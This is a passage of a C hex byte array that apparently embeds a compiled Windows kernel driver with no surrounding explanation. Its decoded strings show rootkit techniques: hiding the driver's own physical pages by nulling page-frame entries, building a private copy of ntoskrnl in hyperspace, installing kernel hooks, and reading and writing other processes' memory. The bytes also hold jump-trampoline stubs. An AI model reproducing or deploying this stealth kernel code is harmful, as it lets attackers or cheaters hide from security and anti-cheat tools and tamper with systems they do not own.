    0x7C, 0x52, 0x00, 0x00, 0xEB, 0xA0, 0x4C, 0x8B, 0xA4, 0x24, 0xD0, 0x00, 0x00, 0x00, 0xEB, 0xDF,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC0,
    0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x4A, 0x98, 0xFF, 0xFF, 0x53, 0x98, 0xFF, 0xFF, 0x5D, 0x98, 0xFF, 0xFF,
    0x64, 0x98, 0xFF, 0xFF, 0x74, 0x98, 0xFF, 0xFF, 0xB8, 0x98, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0xB8, 0x98, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0xB8, 0x98, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0xB8, 0x98, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF, 0x4A, 0x99, 0xFF, 0xFF,
    0xB8, 0x98, 0xFF, 0xFF, 0xB8, 0x98, 0xFF, 0xFF, 0xF4, 0x98, 0xFF, 0xFF, 0x2C, 0x99, 0xFF, 0xFF,
    0x2D, 0x9B, 0xFF, 0xFF, 0x6F, 0x9B, 0xFF, 0xFF, 0x2D, 0x9B, 0xFF, 0xFF, 0x6F, 0x9B, 0xFF, 0xFF,
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0xC3, 0x4B, 0xBE, 0xFF, 0xFF,
    0xAE, 0xBE, 0xFF, 0xFF, 0xF0, 0xBE, 0xFF, 0xFF, 0xF6, 0xBE, 0xFF, 0xFF, 0xFC, 0xBE, 0xFF, 0xFF,
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0xC3, 0x63, 0x6F, 0x70, 0x79,
    0x5F, 0x70, 0x61, 0x67, 0x65, 0x5F, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x5F, 0x77, 0x69, 0x74,
    0x68, 0x5F, 0x73, 0x65, 0x6C, 0x66, 0x5F, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E, 0x63, 0x65,
    0x5F, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x00, 0x75, 0x70, 0x64, 0x61, 0x74, 0x65, 0x5F, 0x63, 0x6C,
    0x6F, 0x6E, 0x65, 0x64, 0x5F, 0x73, 0x65, 0x6C, 0x66, 0x5F, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65,
    0x6E, 0x63, 0x65, 0x5F, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x00, 0x66, 0x69, 0x6E, 0x64, 0x5F, 0x70,
    0x6D, 0x6C, 0x34, 0x5F, 0x73, 0x65, 0x6C, 0x66, 0x5F, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E,
    0x63, 0x65, 0x5F, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64, 0x20, 0x68, 0x79, 0x70,
    0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x50, 0x4D, 0x4C, 0x34, 0x20, 0x77, 0x69, 0x74,
    0x68, 0x20, 0x25, 0x73, 0x20, 0x73, 0x65, 0x6C, 0x66, 0x2D, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65,
    0x6E, 0x63, 0x65, 0x20, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20,
    0x63, 0x6F, 0x70, 0x79, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x73,
    0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x73, 0x65, 0x6C, 0x66, 0x2D, 0x72, 0x65, 0x66, 0x65, 0x72,
    0x65, 0x6E, 0x63, 0x65, 0x20, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x00, 0x61, 0x6C, 0x6C, 0x6F, 0x63,
    0x61, 0x74, 0x65, 0x5F, 0x63, 0x6F, 0x6E, 0x74, 0x69, 0x67, 0x75, 0x6F, 0x75, 0x73, 0x5F, 0x6D,
    0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00, 0x77, 0x72, 0x69, 0x74, 0x65, 0x5F, 0x70, 0x72, 0x6F, 0x63,
    0x65, 0x73, 0x73, 0x5F, 0x6D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00, 0x72, 0x65, 0x61, 0x64, 0x5F,
    0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x5F, 0x6D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00, 0x7E,
    0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x5F, 0x6D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00, 0x68, 0x69,
    0x64, 0x65, 0x5F, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x5F, 0x6D, 0x65, 0x6D, 0x6F,
    0x72, 0x79, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63,
    0x6C, 0x65, 0x61, 0x6E, 0x65, 0x64, 0x20, 0x75, 0x70, 0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72,
    0x6E, 0x6C, 0x20, 0x64, 0x65, 0x65, 0x70, 0x20, 0x63, 0x6F, 0x70, 0x79, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20,
    0x74, 0x6F, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x20, 0x74, 0x65, 0x6D, 0x70,
    0x20, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x50, 0x4D, 0x4C, 0x34,
    0x20, 0x63, 0x6F, 0x70, 0x79, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C,
    0x69, 0x7A, 0x65, 0x64, 0x20, 0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x66, 0x75, 0x6C, 0x6C,
    0x79, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x74, 0x68,
    0x72, 0x65, 0x61, 0x64, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74, 0x65, 0x64, 0x20, 0x73,
    0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x66, 0x75, 0x6C, 0x6C, 0x79, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x68, 0x6F, 0x6F, 0x6B, 0x20, 0x69, 0x6E, 0x73,
    0x74, 0x61, 0x6C, 0x6C, 0x65, 0x64, 0x20, 0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x66, 0x75,
    0x6C, 0x6C, 0x79, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61,
    0x74, 0x65, 0x20, 0x70, 0x61, 0x67, 0x65, 0x5F, 0x70, 0x61, 0x73, 0x20, 0x61, 0x72, 0x72, 0x61,
    0x79, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61,
    0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65,
    0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x74, 0x72, 0x61, 0x63, 0x6B, 0x69, 0x6E, 0x67, 0x20, 0x61,
    0x72, 0x72, 0x61, 0x79, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x64, 0x20, 0x74, 0x72, 0x61, 0x63, 0x6B,
    0x65, 0x64, 0x20, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x20, 0x70, 0x61, 0x67, 0x65,
    0x3A, 0x20, 0x50, 0x41, 0x3D, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x2C, 0x20, 0x56, 0x41, 0x3D,
    0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74, 0x65, 0x64, 0x20, 0x68, 0x69, 0x64,
    0x69, 0x6E, 0x67, 0x20, 0x25, 0x7A, 0x75, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x70,
    0x61, 0x67, 0x65, 0x73, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x72, 0x61, 0x6E, 0x67, 0x65, 0x20, 0x30,
    0x78, 0x25, 0x6C, 0x6C, 0x78, 0x2D, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20,
    0x74, 0x6F, 0x20, 0x67, 0x65, 0x74, 0x20, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x20,
    0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x74, 0x61, 0x72, 0x67,
    0x65, 0x74, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x6D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x20, 0x65, 0x6E, 0x64,
    0x73, 0x20, 0x61, 0x74, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65,
    0x64, 0x20, 0x6D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x20, 0x69, 0x6E, 0x20, 0x68, 0x79, 0x70, 0x65,
    0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x61, 0x74, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x72, 0x65,
    0x61, 0x74, 0x65, 0x64, 0x20, 0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x75, 0x61, 0x6C, 0x69,
    0x7A, 0x65, 0x64, 0x20, 0x63, 0x6F, 0x70, 0x79, 0x20, 0x6F, 0x66, 0x20, 0x6E, 0x74, 0x6F, 0x73,
    0x6B, 0x72, 0x6E, 0x6C, 0x20, 0x69, 0x6E, 0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61,
    0x63, 0x65, 0x20, 0x61, 0x74, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x50, 0x45, 0x42, 0x20, 0x66, 0x6F, 0x75,
    0x6E, 0x64, 0x20, 0x61, 0x74, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64,
    0x20, 0x31, 0x47, 0x42, 0x20, 0x68, 0x75, 0x67, 0x65, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x50,
    0x44, 0x50, 0x54, 0x45, 0x20, 0x61, 0x74, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74,
    0x65, 0x64, 0x20, 0x34, 0x4B, 0x42, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x50, 0x54, 0x45, 0x20,
    0x61, 0x74, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64, 0x20, 0x32, 0x4D,
    0x42, 0x20, 0x6C, 0x61, 0x72, 0x67, 0x65, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x50, 0x44, 0x45,
    0x20, 0x61, 0x74, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x73, 0x75, 0x69,
    0x74, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x67, 0x61, 0x70, 0x20, 0x61, 0x74, 0x20, 0x30, 0x78, 0x25,
    0x6C, 0x6C, 0x78, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x20, 0x30, 0x78,
    0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x73, 0x75, 0x69, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x20,
    0x65, 0x6D, 0x70, 0x74, 0x79, 0x2F, 0x6E, 0x75, 0x6C, 0x6C, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20,
    0x72, 0x61, 0x6E, 0x67, 0x65, 0x20, 0x77, 0x69, 0x74, 0x68, 0x69, 0x6E, 0x20, 0x2E, 0x74, 0x65,
    0x78, 0x74, 0x20, 0x73, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x61, 0x74, 0x20, 0x30, 0x78,
    0x25, 0x6C, 0x6C, 0x78, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x20, 0x30,
    0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x73, 0x74, 0x61, 0x72, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x74, 0x6F, 0x20, 0x68, 0x69,
    0x64, 0x65, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x70, 0x61, 0x67, 0x65, 0x73, 0x20,
    0x61, 0x74, 0x20, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C,
    0x78, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x20, 0x30, 0x78, 0x25, 0x6C,
    0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66,
    0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x20, 0x74,
    0x6F, 0x20, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20,
    0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x4D, 0x6D, 0x47, 0x65, 0x74, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x46,
    0x6F, 0x72, 0x50, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x20, 0x61, 0x66, 0x74, 0x65, 0x72,
    0x20, 0x6E, 0x75, 0x6C, 0x6C, 0x69, 0x6E, 0x67, 0x20, 0x4D, 0x4D, 0x50, 0x46, 0x4E, 0x2E, 0x50,
    0x74, 0x65, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20,
    0x66, 0x6F, 0x72, 0x20, 0x50, 0x46, 0x4E, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x4D, 0x6D, 0x47, 0x65, 0x74,
    0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x46, 0x6F, 0x72, 0x50, 0x68, 0x79, 0x73, 0x69, 0x63,
    0x61, 0x6C, 0x20, 0x62, 0x65, 0x66, 0x6F, 0x72, 0x65, 0x20, 0x6E, 0x75, 0x6C, 0x6C, 0x69, 0x6E,
    0x67, 0x20, 0x4D, 0x4D, 0x50, 0x46, 0x4E, 0x2E, 0x50, 0x74, 0x65, 0x41, 0x64, 0x64, 0x72, 0x65,
    0x73, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x50, 0x46, 0x4E,
    0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x68, 0x69, 0x64, 0x64, 0x65, 0x6E, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65,
    0x72, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x50, 0x46, 0x4E, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C,
    0x78, 0x20, 0x61, 0x74, 0x20, 0x56, 0x41, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65,
    0x64, 0x20, 0x74, 0x6F, 0x20, 0x68, 0x69, 0x64, 0x65, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72,
    0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x50, 0x46, 0x4E, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78,
    0x20, 0x61, 0x74, 0x20, 0x56, 0x41, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D,
    0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x68, 0x69, 0x64, 0x64, 0x65, 0x6E,
    0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x50, 0x46, 0x4E,
    0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x20, 0x66, 0x72, 0x6F, 0x6D, 0x20, 0x32, 0x4D, 0x42,
    0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x61, 0x74, 0x20, 0x56, 0x41, 0x20, 0x30, 0x78, 0x25, 0x6C,
    0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x68,
    0x69, 0x64, 0x64, 0x65, 0x6E, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x70, 0x61, 0x67,
    0x65, 0x20, 0x50, 0x46, 0x4E, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x20, 0x66, 0x72, 0x6F,
    0x6D, 0x20, 0x31, 0x47, 0x42, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x61, 0x74, 0x20, 0x56, 0x41,
    0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x74, 0x72,
    0x61, 0x6E, 0x73, 0x6C, 0x61, 0x74, 0x65, 0x20, 0x56, 0x41, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C,
    0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x72,
    0x65, 0x61, 0x74, 0x65, 0x64, 0x20, 0x6E, 0x65, 0x77, 0x20, 0x50, 0x44, 0x50, 0x54, 0x20, 0x61,
    0x74, 0x20, 0x50, 0x41, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x75, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x65, 0x78,
    0x69, 0x73, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x50, 0x44, 0x50, 0x54, 0x20, 0x61, 0x74, 0x20, 0x50,
    0x41, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64, 0x20, 0x6E, 0x65, 0x77,
    0x20, 0x50, 0x44, 0x20, 0x61, 0x74, 0x20, 0x50, 0x41, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x75, 0x73, 0x69,
    0x6E, 0x67, 0x20, 0x65, 0x78, 0x69, 0x73, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x50, 0x44, 0x20, 0x61,
    0x74, 0x20, 0x50, 0x41, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x6F, 0x70, 0x69, 0x65, 0x64, 0x20, 0x70,
    0x61, 0x67, 0x65, 0x20, 0x25, 0x7A, 0x75, 0x20, 0x66, 0x72, 0x6F, 0x6D, 0x20, 0x30, 0x78, 0x25,
    0x6C, 0x6C, 0x78, 0x20, 0x74, 0x6F, 0x20, 0x50, 0x41, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x6A, 0x75, 0x6D,
    0x70, 0x20, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69,
    0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x20, 0x50, 0x44, 0x45,
    0x5B, 0x25, 0x75, 0x5D, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61,
    0x6C, 0x20, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C,
